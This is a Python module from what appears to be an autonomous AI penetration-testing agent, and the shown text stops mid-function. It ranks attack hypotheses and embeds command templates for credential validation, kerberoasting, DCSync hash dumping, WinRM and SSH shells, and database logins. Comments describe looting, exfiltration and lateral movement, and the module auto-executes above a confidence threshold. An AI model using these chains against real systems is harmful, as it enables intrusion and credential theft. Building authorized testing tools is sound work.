"""
agents/reasoning/decision_engine.py

Converts ranked hypotheses into justified, executable actions.

Before executing ANY tool the DecisionEngine:
  1. Checks the hypothesis meets the confidence threshold
  2. Verifies the tool+service has not already failed (NegativeMemory)
  3. Forces the LLM to produce a PreExecutionPlan (objective + actions + fallbacks)
  4. Returns a JustifiedAction with reason/expected_outcome/success_criteria

This is the component that replaces "run every tool" with
"run the minimum action necessary to test the best hypothesis".

Scoring
-------
  +10  validated foothold (shell or flag obtained)
  +5   high-confidence finding confirmed
  +2   hypothesis partially validated
  -3   redundant scan (tool already run on same target)
  -5   irrelevant exploit attempt (confidence < 0.4 but ran anyway)
  -10  repeated failed action (same tool+service tried again)
"""

from __future__ import annotations

import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

from agents.reasoning.hypothesis_engine import Hypothesis
from agents.reasoning.attack_planner    import RankedAttackPath
from agents.reasoning.negative_memory   import NegativeMemory


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class PreExecutionPlan:
    """
    Mandatory plan produced before any tool runs.
    Forces the LLM to reason about *why* an action is being taken.
    """
    objective:         str
    current_best_path: str
    required_actions:  List[str] = field(default_factory=list)
    fallback_paths:    List[str] = field(default_factory=list)
    risk_assessment:   str       = "medium"  # low|medium|high|critical

    def to_dict(self) -> dict:
        return {
            "objective":         self.objective,
            "current_best_path": self.current_best_path,
            "required_actions":  list(self.required_actions),
            "fallback_paths":    list(self.fallback_paths),
            "risk_assessment":   self.risk_assessment,
        }


@dataclass
class JustifiedAction:
    """
    A single executable action that has been approved by the DecisionEngine.
    Carries the full reasoning chain so the operator can audit every decision.
    """
    action_id:            str
    tool:                 str
    args:                 str
    target_service:       str
    reason:               str
    expected_outcome:     str
    success_criteria:     str
    hypothesis_id:        str
    confidence:           float
    requires_confirmation: bool = False
    plan:                 Optional[PreExecutionPlan] = None
    created_at:           str  = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )

    def to_dict(self) -> dict:
        return {
            "action_id":            self.action_id,
            "tool":                 self.tool,
            "args":                 self.args,
            "target_service":       self.target_service,
            "reason":               self.reason,
            "expected_outcome":     self.expected_outcome,
            "success_criteria":     self.success_criteria,
            "hypothesis_id":        self.hypothesis_id,
            "confidence":           self.confidence,
            "requires_confirmation": self.requires_confirmation,
            "plan":                 self.plan.to_dict() if self.plan else None,
            "created_at":           self.created_at,
        }


# Scoring deltas
_SCORE_FOOTHOLD:          int = +10
_SCORE_HIGH_CONF_FINDING: int = +5
_SCORE_PARTIAL_VALID:     int = +2
_SCORE_REDUNDANT_SCAN:    int = -3
_SCORE_IRRELEVANT_EXPLOIT: int = -5
_SCORE_REPEATED_FAILURE:  int = -10


# ---------------------------------------------------------------------------
# DecisionEngine
# ---------------------------------------------------------------------------

class DecisionEngine:
    """
    Selects the next action to execute based on ranked hypotheses.

    Parameters
    ----------
    think_json_fn:
        Async callable matching BaseAgent.think_json(prompt, system) → dict.
    emit_fn:
        Async broadcast callable — used to emit reasoning events to frontend.
    session_id:
        Active session identifier.
    auto_execute_threshold:
        Confidence floor for automatic execution (default 0.70).
        Actions below this threshold set requires_confirmation=True.
    """

    AUTO_EXECUTE_THRESHOLD: float = 0.70

    def __init__(
        self,
        think_json_fn:          Callable[..., Coroutine],
        emit_fn:                Callable[..., Any],
        session_id:             str,
        auto_execute_threshold: float = 0.70,
        voi_rank_fn:            Optional[Callable[[List[Dict[str, Any]]], List[Dict[str, Any]]]] = None,
    ) -> None:
        self._think_json  = think_json_fn
        self._emit        = emit_fn
        self._session_id  = session_id
        self._threshold   = auto_execute_threshold
        self._action_score: int = 0
        # Optional Value-of-Information ranker injected by MasterAgent.
        # Signature: rank_actions(list[dict]) -> list[dict] sorted by VoI desc,
        # each dict augmented with voi_score / voi_factors / voi_reasons / voi_dropped.
        self._voi_rank_fn = voi_rank_fn

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def select_action(
        self,
        hypotheses:      List[Hypothesis],
        intel:           dict,
        used_tools:      Dict[str, int],
        negative_memory: NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """
        Select the best actionable hypothesis and return a JustifiedAction.

        Returns None when:
          - No actionable hypotheses exist (all invalidated or empty)
          - The best hypothesis has no recommended_next_actions

        Sets requires_confirmation=True when confidence < threshold.

        Parameters
        ----------
        hypotheses:
            Sorted by confidence descending (from HypothesisEngine).
        intel:
            Current master agent _intel dict.
        used_tools:
            {tool_name: run_count} tracking for redundancy detection.
        negative_memory:
            Failed attempts registry for quick pre-flight checks.
        """
        target = intel.get("target", "")

        # ── Phase 0a: Credentialed primer (HIGHEST priority) ─────────────
        # When operator notes contain ANY user:pass credentials AND a
        # service known to accept them is open, fire the deterministic
        # creds-in-hand chain ahead of everything else.  Covers AD
        # (SMB/WinRM/RDP/LDAP/Kerberos), Linux (SSH), databases (MySQL,
        # Postgres, MSSQL, MongoDB, Redis, Elasticsearch), web auth
        # (HTTP basic, Tomcat manager), and mail (SMTP).  The first step
        # whose port is open and whose chain hasn't yet fired runs.
        cred_primer = self._next_credentialed_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if cred_primer is not None:
            await self._emit_reasoning(
                f"[cred-primer] credentialed step: {cred_primer.tool} "
                f"→ {cred_primer.target_service} ({cred_primer.reason[:80]})"
            )
            return cred_primer

        # ── Phase 0b: No-creds AD primer ─────────────────────────────────
        # When AD ports are open but no operator creds are available,
        # fire the deterministic AD-from-zero chain: kerbrute user enum,
        # null-session enum, anonymous LDAP, AS-REP roast against
        # discovered users, conservative password spray.  This is the
        # single biggest "we got nothing" gap on AD targets.
        nocreds_ad = self._next_nocreds_ad_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if nocreds_ad is not None:
            await self._emit_reasoning(
                f"[nocreds-ad] AD-from-zero step: {nocreds_ad.tool} "
                f"→ {nocreds_ad.target_service} ({nocreds_ad.reason[:80]})"
            )
            return nocreds_ad

        # ── Phase 0c: Default-credential spray primer ────────────────────
        # Open service + no creds + no known unauth path → try the top
        # default username/password pairs known for that service before
        # falling through to the LLM planner.
        default_spray = self._next_default_creds_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if default_spray is not None:
            await self._emit_reasoning(
                f"[default-creds] common-default check: {default_spray.tool} "
                f"→ {default_spray.target_service} ({default_spray.reason[:80]})"
            )
            return default_spray

        # ── Phase 0d: Web-exploitation primer ────────────────────────────
        # When http(s) is open but no shell yet, fire a deterministic
        # ladder of web vuln probes (nuclei templated scan → cms-specific
        # → SQLi → SSTI → LFI → upload bypass).
        web_primer = self._next_web_exploit_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if web_primer is not None:
            await self._emit_reasoning(
                f"[web-primer] web exploit step: {web_primer.tool} "
                f"→ {web_primer.target_service} ({web_primer.reason[:80]})"
            )
            return web_primer

        # ── Phase 0e: Post-foothold primer (loot + privesc enum) ─────────
        # Once a real foothold exists, fire a deterministic post-ex chain
        # before the LLM gets a turn: enum the box, harvest creds/keys,
        # dump cred files, run priv-esc enum scripts, scrape browser
        # storage.  Output feeds the exfiltration pipeline.
        post_foothold = self._next_post_foothold_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if post_foothold is not None:
            await self._emit_reasoning(
                f"[post-foothold] {post_foothold.tool} "
                f"→ {post_foothold.target_service} ({post_foothold.reason[:80]})"
            )
            return post_foothold

        # ── Phase 0f: Lateral-movement primer ────────────────────────────
        # Once we have a shell + internal visibility, deterministically
        # discover other reachable hosts and reuse harvested creds /
        # keys / hashes against them.
        lateral = self._next_lateral_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if lateral is not None:
            await self._emit_reasoning(
                f"[lateral] {lateral.tool} → {lateral.target_service} "
                f"({lateral.reason[:80]})"
            )
            return lateral

        # ── Phase 0g (Recommendation E): Foothold primers force-promoted ────
        # If an open service has a registered cheap-unauth primer chain
        # (FTP anon, telnet default-creds, SNMP public, SMB null-session,
        # DB default-creds, redis unauth) that has NOT yet been tried this
        # session, fire its first read-only step ahead of any LLM-proposed
        # action.  This is what turns "did we even try the door?" from a
        # planner-luck question into a deterministic guarantee.
        primer = self._next_unused_foothold_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if primer is not None:
            await self._emit_reasoning(
                f"[primer] auto-firing cheap-foothold probe: "
                f"{primer.tool} → {primer.target_service} (chain={primer.plan.path[0] if primer.plan and primer.plan.path else '?'})"
            )
            return primer

        # ── Phase 1: gather every viable (hypothesis, action) candidate ─────
        # Recommendation G — index validated hypotheses by id so dependent
        # steps in the current iteration can check whether their parent
        # has already landed.
        validated_ids: set = {
            h.hypothesis_id for h in hypotheses
            if getattr(h, "validated", False)
        }

        candidates: List[Dict[str, Any]] = []
        for hypothesis in hypotheses:
            if hypothesis.invalidated:
                continue
            if not hypothesis.recommended_next_actions:
                continue

            # Defer dependent steps until their parent is validated.  Steps
            # without a parent (the common case, idx=1) fall through.
            parent_id = getattr(hypothesis, "parent_hypothesis_id", None)
            if parent_id and parent_id not in validated_ids:
                await self._emit_reasoning(
                    f"Deferring step {getattr(hypothesis, 'step_index', '?')} "
                    f"({hypothesis.statement[:60]}…) — parent not yet validated"
                )
                continue

            for action_str in hypothesis.recommended_next_actions:
                if not action_str or not action_str.strip():
                    continue

                tool, args, target_service = self._parse_action_str(
                    action_str, target
                )
                if tool == "unknown":
                    continue

                # Hard skip: this exact (tool, service, args_signature) failed
                # before — Recommendation D's fine-grained ban.  A previous
                # sqlmap on /login.php?user= failing no longer blocks sqlmap
                # on /admin/api/users.php?id=.
                if negative_memory.has_failed_before(tool, target_service, args=args):
                    count = negative_memory.attempt_count(tool, target_service, args=args)
                    await self._emit_reasoning(
                        f"Skipping {tool} on {target_service} (this variant) — "
                        f"failed {count}x previously"
                    )
                    continue

                # Hard skip: scan already exhausted
                tool_key = f"{tool}:{target_service}"
                if used_tools.get(tool_key, 0) >= 3:
                    await self._emit_reasoning(
                        f"Skipping redundant scan: {tool} on {target_service} "
                        f"already run {used_tools[tool_key]}x"
                    )
                    continue

                candidates.append({
                    "tool":           tool,
                    "args":           args,
                    "target_service": target_service,
                    "action_str":     action_str,
                    "phase":          intel.get("current_phase", ""),
                    "confidence":     hypothesis.confidence,
                    "_hypothesis":    hypothesis,
                })

        if not candidates:
            return None

        # ── Phase 2: Value-of-Information re-ranking ────────────────────────
        ranked = candidates
        if self._voi_rank_fn is not None:
            try:
                # Strip the hypothesis ref before scoring (not JSON-friendly),
                # then re-attach by index after.
                scoring_input = [
                    {k: v for k, v in c.items() if k != "_hypothesis"}
                    for c in candidates
                ]
                scored = self._voi_rank_fn(scoring_input)
                # Re-attach hypothesis by matching action_str + tool + target_service
                lookup = {
                    (c["tool"], c["target_service"], c["action_str"]): c["_hypothesis"]
                    for c in candidates
                }
                ranked = []
                for s in scored:
                    key = (s.get("tool"), s.get("target_service"), s.get("action_str"))
                    s["_hypothesis"] = lookup.get(key)
                    ranked.append(s)
                # Drop hard-rejected actions
                ranked = [r for r in ranked if not r.get("voi_dropped")]
                # Emit a transparency event with the top of the ranking
                await self._emit_voi_ranking(ranked[:5])
            except Exception as exc:
                await self._emit_reasoning(f"VoI ranking failed: {exc}")
                ranked = candidates

        if not ranked:
            return None

        chosen = ranked[0]
        hypothesis = chosen.get("_hypothesis")
        if hypothesis is None:
            return None

        # Build pre-execution plan for the winner
        plan = await self.build_pre_execution_plan(hypothesis, intel)

        voi_score   = chosen.get("voi_score")
        voi_reasons = chosen.get("voi_reasons") or []

        reason = self._build_reason(hypothesis)
        if voi_score is not None:
            reason = f"[VoI={voi_score}] " + reason
            if voi_reasons:
                reason += "  ::  " + "; ".join(voi_reasons[:3])

        action = JustifiedAction(
            action_id            = str(uuid.uuid4()),
            tool                 = chosen["tool"],
            args                 = chosen["args"],
            target_service       = chosen["target_service"],
            reason               = reason,
            expected_outcome     = chosen.get("action_str", ""),
            success_criteria     = self._build_success_criteria(hypothesis),
            hypothesis_id        = hypothesis.hypothesis_id,
            confidence           = hypothesis.confidence,
            requires_confirmation = hypothesis.confidence < self._threshold,
            plan                 = plan,
        )

        await self._emit_action(action)
        return action

    async def build_pre_execution_plan(
        self,
        hypothesis: Hypothesis,
        intel:      dict,
    ) -> PreExecutionPlan:
        """
        Force the LLM to produce an explicit plan before any tool runs.

        Returns a safe fallback plan on LLM failure.
        """
        system = (
            "You are a penetration tester about to execute an attack step. "
            "Before running any tool you must articulate your objective, the "
            "specific path you are following, the ordered actions required, and "
            "fallback options if the primary path fails. "
            "Respond ONLY with valid JSON. No markdown."
        )

        target = intel.get("target", "unknown")
        shell  = "YES" if intel.get("shell_access") else "NO"

        prompt = (
            f"Target: {target}\n"
            f"Shell access: {shell}\n"
            f"Hypothesis: {hypothesis.statement}\n"
            f"Confidence: {hypothesis.confidence:.2f}\n"
            f"Supporting evidence: {', '.join(hypothesis.evidence_supporting[:3])}\n"
            f"Next actions proposed: {', '.join(hypothesis.recommended_next_actions[:3])}\n\n"
            "Produce a pre-execution plan in EXACTLY this JSON format:\n"
            "{\n"
            '  "objective": "specific goal of this action",\n'
            '  "current_best_path": "brief description of the attack path",\n'
            '  "required_actions": ["ordered list of exact tool commands"],\n'
            '  "fallback_paths": ["alternative approaches if primary fails"],\n'
            '  "risk_assessment": "low|medium|high|critical"\n'
            "}"
        )

        try:
            raw = await self._think_json(prompt, system)
            if raw and isinstance(raw, dict):
                return PreExecutionPlan(
                    objective         = str(raw.get("objective", hypothesis.statement)),
                    current_best_path = str(raw.get("current_best_path", "")),
                    required_actions  = [
                        str(a) for a in (raw.get("required_actions") or [])
                    ],
                    fallback_paths    = [
                        str(f) for f in (raw.get("fallback_paths") or [])
                    ],
                    risk_assessment   = str(raw.get("risk_assessment", "medium")),
                )
        except Exception:
            pass

        # Safe fallback
        return PreExecutionPlan(
            objective         = hypothesis.statement,
            current_best_path = hypothesis.statement,
            required_actions  = list(hypothesis.recommended_next_actions[:3]),
            fallback_paths    = [],
            risk_assessment   = "medium",
        )

    async def score_action_result(
        self,
        action:       JustifiedAction,
        result:       dict,
        validated:    bool,
        intel:        dict,
    ) -> Tuple[int, str]:
        """
        Apply scoring rules and return (new_total_score, reason_string).

        Called by ReasoningLoop._update() after every tool execution.
        """
        delta  = 0
        reason = ""

        # Foothold obtained
        if intel.get("shell_access") and not result.get("_was_shell_before", False):
            delta  += _SCORE_FOOTHOLD
            reason  = "Foothold obtained — shell access confirmed"

        # Flag captured
        elif intel.get("user_flag") or intel.get("root_flag"):
            delta  += _SCORE_FOOTHOLD
            reason  = "Flag captured"

        # High-confidence finding validated
        elif validated and action.confidence >= 0.7:
            delta  += _SCORE_HIGH_CONF_FINDING
            reason  = f"High-confidence finding validated (conf={action.confidence:.2f})"

        # Partial validation
        elif validated:
            delta  += _SCORE_PARTIAL_VALID
            reason  = "Hypothesis partially validated"

        # Repeated failure (negative memory already had this)
        elif not validated and action.confidence < 0.4:
            delta  += _SCORE_IRRELEVANT_EXPLOIT
            reason  = f"Low-confidence exploit attempt failed (conf={action.confidence:.2f})"

        # Not validated — neutral, no penalty for honest attempts
        else:
            reason = "Action executed — hypothesis not yet validated"

        self._action_score += delta
        return self._action_score, reason

    def get_score(self) -> int:
        """Return the current cumulative engagement score."""
        return self._action_score

    def set_score(self, score: int) -> None:
        """Restore score from checkpoint."""
        self._action_score = score

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _parse_action_str(
        self,
        action_str: str,
        target:     str,
    ) -> Tuple[str, str, str]:
        """
        Parse an action string like "sqlmap -u http://TARGET/login" into
        (tool, args, target_service).

        Falls back gracefully when the string is not a recognisable command.
        """
        action_str = action_str.strip()
        parts      = action_str.split(None, 1)  # split on first whitespace
        tool       = parts[0].lower() if parts else "unknown"
        args       = parts[1] if len(parts) > 1 else ""

        # Derive a target_service identifier from the args or tool name
        target_service = self._infer_target_service(tool, args, target)

        return tool, args, target_service

    def _infer_target_service(self, tool: str, args: str, target: str) -> str:
        """
        Attempt to derive a "service:port" identifier from tool and args.
        Used for NegativeMemory dedup and redundancy detection.
        """
        combined = (args or "").lower()

        # Port patterns
        import re
        port_match = re.search(r':(\d{2,5})', combined)
        if port_match:
            port = port_match.group(1)
            # Guess service from port
            service_map = {
                "21": "ftp", "22": "ssh", "23": "telnet",
                "25": "smtp", "53": "dns", "80": "http",
                "110": "pop3", "143": "imap", "389": "ldap",
                "443": "https", "445": "smb", "1433": "mssql",
                "1521": "oracle", "3306": "mysql", "3389": "rdp",
                "5432": "postgresql", "5900": "vnc", "6379": "redis",
                "8080": "http", "8443": "https", "8888": "http",
            }
            svc = service_map.get(port, "tcp")
            return f"{svc}:{port}"

        # Tool → service inference
        tool_service = {
            "sqlmap":     f"http:80",
            "hydra":      f"ssh:22",
            "crackmapexec": f"smb:445",
            "nmap":       f"scan:{target}",
            "gobuster":   f"http:80",
            "ffuf":       f"http:80",
            "nikto":      f"http:80",
            "dirb":       f"http:80",
            "wpscan":     f"http:80",
            "msfconsole": f"exploit:{target}",
            "searchsploit": f"exploit:{target}",
            "impacket-secretsdump": f"smb:445",
            "evil-winrm": f"winrm:5985",
            "bloodhound-python": f"ldap:389",
        }
        return tool_service.get(tool, f"{tool}:{target}")

    # ── Credentialed primer (operator-supplied creds chain) ──────────────
    # When the operator pastes credentials in `notes` / `scope` we fire
    # this deterministic chain ahead of any LLM planning.  Each entry
    # produces a single command using the placeholders:
    #   {target}, {user}, {pass}, {domain}, {dc_ip}, {base_dn}
    # Steps that need {domain}/{base_dn} skip themselves until those
    # values are populated by recon (rdp-ntlm-info, ldap rootDSE, etc.) —
    # so a Linux SSH-only box never tries to kerberoast.
    #
    # Coverage matrix (port → handler):
    #   22         SSH login
    #   21         FTP login
    #   25/587     SMTP AUTH
    #   88         Kerberoast / AS-REP roast      (AD)
    #   389        LDAP simple bind / BloodHound  (AD)
    #   445        SMB validate / enum / DCSync   (AD)
    #   1433       MSSQL login (Windows-auth)     (AD-friendly)
    #   3306       MySQL login
    #   3389       RDP login                      (AD-friendly)
    #   5432       PostgreSQL login
    #   5985       WinRM check + evil-winrm       (AD)
    #   6379       Redis AUTH
    #   8080/8443  HTTP basic / Tomcat manager
    #   9200       Elasticsearch
    #   27017      MongoDB
    #
    # Order matters for boxes where multiple services accept the same
    # creds — we list the cheapest-to-shell paths first (SSH, evil-winrm)
    # so the platform lands a foothold ASAP.
    _CRED_PRIMERS: List[Dict[str, Any]] = [
        # ── SSH (Linux/Unix path to shell) ────────────────────────────
        # Single non-interactive command that proves auth + dumps host
        # info.  `id` output (`uid=N(...)`) trips register_shell's real-
        # foothold regex so the post-ex / privesc gate flips correctly.
        {"chain": "ssh_creds_login", "ports": ["22"],
         "tool": "sshpass",
         "args": "-p '{pass}' ssh -o StrictHostKeyChecking=no -o BatchMode=no -o ConnectTimeout=10 -o PreferredAuthentications=password -o PubkeyAuthentication=no {user}@{target} 'id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null'",
         "service_label": "ssh:22",
         "rationale": "SSH login with creds — produces uid= evidence, instant Linux foothold"},
        # ── AD: SMB cred validation ───────────────────────────────────
        {"chain": "ad_creds_validate_smb", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb {target} -u '{user}' -p '{pass}'",
         "service_label": "smb:445",
         "rationale": "validate AD credentials before heavier action"},
        # ── AD: SMB enumeration ───────────────────────────────────────
        {"chain": "ad_creds_enum_smb", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb {target} -u '{user}' -p '{pass}' --shares --users --groups --pass-pol --rid-brute 4000",
         "service_label": "smb:445",
         "rationale": "enumerate AD with creds — shares, users, groups, RID brute"},
        # ── AD: WinRM check (likely Pwn3d!) ───────────────────────────
        {"chain": "ad_creds_winrm_check", "ports": ["5985"],
         "tool": "crackmapexec",
         "args": "winrm {target} -u '{user}' -p '{pass}'",
         "service_label": "winrm:5985",
         "rationale": "check WinRM — `Pwn3d!` line means evil-winrm gives instant shell"},
        # ── AD: evil-winrm interactive shell ──────────────────────────
        {"chain": "ad_creds_winrm_shell", "ports": ["5985"],
         "tool": "evil-winrm",
         "args": "-i {target} -u '{user}' -p '{pass}'",
         "service_label": "winrm:5985",
         "rationale": "WinRM interactive shell with valid creds — direct foothold"},
        # ── AD: Kerberoasting ─────────────────────────────────────────
        {"chain": "ad_creds_kerberoast", "ports": ["88"],
         "tool": "impacket-GetUserSPNs",
         "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/kerberoast.{target}.txt",
         "service_label": "kerberos:88",
         "rationale": "kerberoast — request TGS for service accounts, crack offline"},
        # ── AD: AS-REP roasting ───────────────────────────────────────
        {"chain": "ad_creds_asreproast", "ports": ["88"],
         "tool": "impacket-GetNPUsers",
         "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/asreproast.{target}.txt",
         "service_label": "kerberos:88",
         "rationale": "AS-REP roast — find users with DONT_REQ_PREAUTH"},
        # ── LDAP simple bind (works on AD and standalone OpenLDAP) ────
        # Skipped if {domain} / {base_dn} unfilled.
        {"chain": "ldap_simple_bind_userinfo", "ports": ["389"],
         "tool": "ldapsearch",
         "args": "-H ldap://{target} -x -D '{user}@{domain}' -w '{pass}' -b '{base_dn}' '(sAMAccountName={user})'",
         "service_label": "ldap:389",
         "rationale": "fetch caller's directory object — group membership, ACL targets"},
        # ── AD: BloodHound collection ─────────────────────────────────
        {"chain": "ad_creds_bloodhound", "ports": ["389"],
         "tool": "bloodhound-python",
         "args": "-d {domain} -u '{user}' -p '{pass}' -ns {target} -c All --zip",
         "service_label": "ldap:389",
         "rationale": "full AD attack-graph collection for offline path analysis"},
        # ── AD: RDP try ───────────────────────────────────────────────
        {"chain": "ad_creds_rdp_try", "ports": ["3389"],
         "tool": "xfreerdp",
         "args": "/v:{target} /u:{user} /p:'{pass}' /cert:ignore /size:1024x768 +clipboard",
         "service_label": "rdp:3389",
         "rationale": "RDP with valid creds — interactive Windows desktop session"},
        # ── AD: SecretsDump (DCSync) ──────────────────────────────────
        {"chain": "ad_creds_secretsdump_try", "ports": ["445"],
         "tool": "impacket-secretsdump",
         "args": "{domain}/{user}:'{pass}'@{target} -just-dc-ntlm",
         "service_label": "smb:445",
         "rationale": "DCSync — gives every NT hash if user has GetChanges rights"},

        # ── Database services ─────────────────────────────────────────
        # MSSQL — Windows auth path; common AD lateral escalation.
        {"chain": "mssql_creds_login", "ports": ["1433"],
         "tool": "impacket-mssqlclient",
         "args": "{user}:'{pass}'@{target} -windows-auth",
         "service_label": "mssql:1433",
         "rationale": "MSSQL Windows-auth — xp_cmdshell often gives RCE on misconfigured boxes"},
        # MySQL — list databases proves cred validity.
        {"chain": "mysql_creds_login", "ports": ["3306"],
         "tool": "mysql",
         "args": "-h {target} -u {user} -p'{pass}' -e 'SELECT user(), version(); SHOW DATABASES;'",
         "service_label": "mysql:3306",
         "rationale": "MySQL with creds — version + DB list, sometimes UDF→RCE path"},
        # PostgreSQL — connection-string variant avoids PGPASSWORD env handling.
        {"chain": "postgres_creds_login", "ports": ["5432"],
         "tool": "psql",
         "args": "'postgresql://{user}:{pass}@{target}:5432/postgres' -c '\\l'",
         "service_label": "postgresql:5432",
         "rationale": "PostgreSQL with creds — list DBs, COPY ... PROGRAM = RCE on >= 9.3"},
        # MongoDB — auth + DB list.
        {"chain": "mongodb_creds_login", "ports": ["27017"],
         "tool": "mongosh",
         "args": "--host {target} -u {user} -p '{pass}' --authenticationDatabase admin --eval 'db.adminCommand({{listDatabases:1}})'",
         "service_label": "mongodb:27017",
         "rationale": "MongoDB with creds — list DBs, server roles for privesc"},
        # Redis — AUTH check (no user, password-only on legacy servers).
        {"chain": "redis_creds_auth", "ports": ["6379"],
         "tool": "redis-cli",
         "args": "-h {target} -a '{pass}' INFO server",
         "service_label": "redis:6379",
         "rationale": "Redis AUTH — server info, then write-key foothold path"},
        # Elasticsearch — basic auth.
        {"chain": "elastic_creds_check", "ports": ["9200"],
         "tool": "curl",
         "args": "-s -u '{user}:{pass}' http://{target}:9200/_cat/indices?v",
         "service_label": "elasticsearch:9200",
         "rationale": "Elasticsearch basic-auth — list indices, possible info leak"},

        # ── FTP ───────────────────────────────────────────────────────
        {"chain": "ftp_creds_login", "ports": ["21"],
         "tool": "curl",
         "args": "-u '{user}:{pass}' --connect-timeout 15 ftp://{target}/ -s -o /dev/null -w 'http_code=%{{http_code}} ftp_user={user}\\n'",
         "service_label": "ftp:21",
         "rationale": "FTP login check — validates creds, lists root"},

        # ── SMTP AUTH (relay / spoofing prerequisite) ─────────────────
        {"chain": "smtp_creds_authcheck", "ports": ["25", "587"],
         "tool": "swaks",
         "args": "--server {target} --auth-user {user} --auth-password '{pass}' --quit-after AUTH",
         "service_label": "smtp:25",
         "rationale": "SMTP AUTH check — validates creds for relay / spoofing"},

        # ── HTTP basic auth (sometimes serves admin panels) ───────────
        {"chain": "http_basic_creds_check", "ports": ["80", "8080"],
         "tool": "curl",
         "args": "-s -o /dev/null -w 'http=%{{http_code}} url=%{{url_effective}}\\n' --connect-timeout 15 -u '{user}:{pass}' http://{target}/",
         "service_label": "http:80",
         "rationale": "HTTP basic-auth check — validates creds against root URL"},
        {"chain": "https_basic_creds_check", "ports": ["443", "8443"],
         "tool": "curl",
         "args": "-sk -o /dev/null -w 'http=%{{http_code}} url=%{{url_effective}}\\n' --connect-timeout 15 -u '{user}:{pass}' https://{target}/",
         "service_label": "https:443",
         "rationale": "HTTPS basic-auth check"},
        # ── Tomcat manager (creds → WAR upload → RCE) ─────────────────
        {"chain": "tomcat_manager_creds", "ports": ["8080", "8443"],
         "tool": "curl",
         "args": "-s -u '{user}:{pass}' --connect-timeout 15 http://{target}:8080/manager/text/list",
         "service_label": "tomcat:8080",
         "rationale": "Tomcat manager check — creds work? then WAR upload → RCE"},
    ]
    # Backwards-compat alias: older code paths may still reference the
    # original AD-only name.  Keep the symbol so nothing imports break.
    _CRED_AD_PRIMERS = _CRED_PRIMERS

    # Regex set for credential extraction from operator_notes free text.
    # Compiled lazily.
    _CRED_PATTERNS = None

    @classmethod
    def _compile_cred_patterns(cls):
        if cls._CRED_PATTERNS is not None:
            return cls._CRED_PATTERNS
        import re
        # All patterns require the password to contain at least one digit OR
        # one special character — this rules out dictionary-word false positives
        # like "no creds yet, just scope ..." matching as user='yet' pass='just'.
        # Real AD passwords almost always have complexity, so this is safe.
        _PWD = r"(?P<pwd>(?=[^\s'\"]*[0-9!@#$%^&*+=_?,.~/\\|:;<>{}\[\]()-])[^\s'\"]{4,})"
        cls._CRED_PATTERNS = [
            # 1. DOMAIN\user:pass   or   DOMAIN/user:pass
            re.compile(rf"(?P<domain>[A-Za-z0-9_.-]+)[\\/](?P<user>[A-Za-z0-9_.-]+)\s*:\s*['\"]?{_PWD}['\"]?"),
            # 2. user@domain.tld:pass
            re.compile(rf"(?P<user>[A-Za-z0-9_.-]+)@(?P<domain>[A-Za-z0-9_.-]+\.[A-Za-z0-9_.-]+)\s*:\s*['\"]?{_PWD}['\"]?"),
            # 3. Explicit user/username + password keys on the same line/note
            re.compile(rf"\b(?:user(?:name)?|login)\s*[:=]\s*['\"]?(?P<user>[A-Za-z0-9_.-]+)['\"]?[\s,;]+(?:pass(?:word)?|pwd)\s*[:=]\s*['\"]?{_PWD}['\"]?", re.I),
            # 4. creds: user / pass   or   credentials = user|pass
            re.compile(rf"\b(?:creds?|credentials?)\s*[:=]?\s+['\"]?(?P<user>[A-Za-z0-9_.-]+)['\"]?\s*[/|]\s*['\"]?{_PWD}['\"]?", re.I),
            # 5. bare user:pass — only when surrounded by whitespace / boundary
            re.compile(rf"(?:^|\s|[\(\[\"'`])(?P<user>[A-Za-z][A-Za-z0-9_.-]{{1,30}}):{_PWD}(?:\s|$|[\)\]\"'`])"),
        ]
        return cls._CRED_PATTERNS

    @classmethod
    def _extract_credentials(cls, intel: dict) -> Optional[Dict[str, str]]:
        """Pull the first valid (user, password, domain) triple from
        operator_notes.  Returns None if no creds detected.

        domain falls back to whatever the recon phase has discovered
        (rdp-ntlm-info, smb-os-discovery, ldap rootDSE) — see
        _resolve_ad_domain.  base_dn is computed from domain.
        """
        notes = intel.get("operator_notes") or []
        if not notes:
            return None

        # Concatenate all note text so a multi-line note still matches.
        blob = "\n".join(
            (n.get("note") if isinstance(n, dict) else str(n)) or ""
            for n in notes
        )
        if not blob.strip():
            return None

        for pat in cls._compile_cred_patterns():
            m = pat.search(blob)
            if not m:
                continue
            gd = m.groupdict()
            user = (gd.get("user") or "").strip()
            pwd  = (gd.get("pwd")  or "").strip()
            dom  = (gd.get("domain") or "").strip()
            # Reject obvious non-creds: empty, http URL fragments, key:value where
            # the "value" is itself a URL or numeric port.
            if not user or not pwd:
                continue
            if user.lower() in ("http", "https", "ftp", "smb", "ssh", "tcp", "udp"):
                continue
            if pwd.startswith(("http", "//", "tcp", "udp")) or pwd.isdigit():
                continue
            if len(pwd) < 4:
                continue
            return {"user": user, "pass": pwd, "domain": dom or ""}

        return None

    # Compiled patterns that recognise an AD DNS domain in tool output.
    # Order matters — DNS-style names beat NetBIOS short names because
    # the DNS form gives us a usable base DN (dc=corp,dc=local).
    _DOMAIN_OUTPUT_PATTERNS = None

    @classmethod
    def _compile_domain_patterns(cls):
        if cls._DOMAIN_OUTPUT_PATTERNS is not None:
